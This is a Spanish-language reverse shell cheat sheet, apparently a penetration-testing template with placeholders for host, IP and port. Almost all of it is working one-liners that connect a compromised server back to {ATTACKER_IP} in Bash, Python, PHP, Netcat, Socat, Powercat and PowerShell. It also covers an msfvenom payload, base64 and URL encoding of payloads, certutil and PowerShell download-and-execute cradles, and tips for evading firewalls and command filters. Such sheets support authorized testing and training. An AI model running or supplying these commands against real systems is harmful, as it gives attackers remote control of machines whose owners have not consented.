# CheatSheet: Reverse Shell

## Fecha: 22/01/2025
## Host: {HOST}
## IP: {IP}

---

## Objetivo
Establecer una conexión inversa desde el servidor comprometido hacia el atacante, proporcionando acceso remoto al sistema objetivo.

---
## Herramientas
1. Netcat
2. Metasploit
3. Bash
4. Python
5. PHP
6. Powercat (para entornos Windows)

---
## Procedimiento y comandos

1. **Preparar el listener en la máquina atacante**:
   ```bash
   nc -lvnp {PORT}
   ```

2. **Iniciar una reverse shell desde el servidor**:
   - **Bash**:
     ```bash
     bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1
     ```
   - **Python**:
     ```python
     python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{ATTACKER_IP}",{PORT})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])'
     ```
   - **PHP**:
     ```php
     php -r '$sock=fsockopen("{ATTACKER_IP}",{PORT}); exec("/bin/sh -i <&3 >&3 2>&3");'
     ```
   - **Netcat (con soporte -e)**:
     ```bash
     nc -e /bin/bash {ATTACKER_IP} {PORT}
     ```
   - **Netcat (sin soporte -e)**:
     ```bash
     rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ATTACKER_IP} {PORT} > /tmp/f
     ```
   - **Powercat (para Windows)**:
     ```powershell
     powercat -c {ATTACKER_IP} -p {PORT} -e cmd.exe
     ```
     Powercat es una herramienta escrita en PowerShell que actúa como Netcat para Windows. Se puede descargar e importar:
     ```powershell
     Import-Module .\powercat.ps1
     ```

3. **Codificación URL y Base64**:
   - **Codificar payloads en URL**:
     ```bash
     echo -n "bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1" | xxd -p | tr -d '\n' | sed 's/\(..\)/%\1/g'
     ```
   - **Codificar payloads en Base64**:
     ```bash
     echo -n "bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1" | base64
     ```
     En el servidor objetivo, decodificar y ejecutar:
     ```bash
     echo {BASE64_PAYLOAD} | base64 -d | bash
     ```

4. **Usar herramientas para obtener shells avanzadas**:
   - Upgrade a TTY shell:
     ```bash
     python -c 'import pty; pty.spawn("/bin/bash")'
     ```

---
## Troubleshooting
1. **Firewall bloqueando puertos**:
   - Usar puertos comunes (HTTP 80 o HTTPS 443).
   - Probar con SSL/TLS para ofuscar tráfico.
     ```bash
     openssl s_client -quiet -connect {ATTACKER_IP}:{PORT}
     ```

2. **Protección contra comandos directos**:
   - Encapsular comandos en scripts.
   - Utilizar nombres de variables obfuscados o codificaciones como Base64.

3. **El listener no recibe conexiones**:
   - Verificar conectividad entre las máquinas.
   - Confirmar que el puerto usado esté abierto en ambas direcciones.

4. **Windows sin herramientas básicas**:
   - Usar herramientas como Powercat o certutil para descargar y ejecutar scripts necesarios.
     ```powershell
     certutil -urlcache -split -f "http://{ATTACKER_IP}/powercat.ps1" powercat.ps1
     ```

---
## Herramientas Alternativas
- [ ] **Socat**: Generación de shells avanzadas.
  ```bash
  socat tcp-connect:{ATTACKER_IP}:{PORT} exec:/bin/bash,pty,stderr,setsid,sigint,sane
  ```
- [ ] **Metasploit**: Creación de payloads personalizados.
  ```bash
  msfvenom -p linux/x86/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT={PORT} -f elf > reverse.elf
  ```
- [ ] **PowerShell**: Reverse shell en sistemas Windows.
  ```powershell
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}/reverse.ps1')"
  ```
- [ ] **Powercat**: Herramienta versátil para shells en Windows.
  ```powershell
  powercat -c {ATTACKER_IP} -p {PORT} -e cmd.exe
  ```


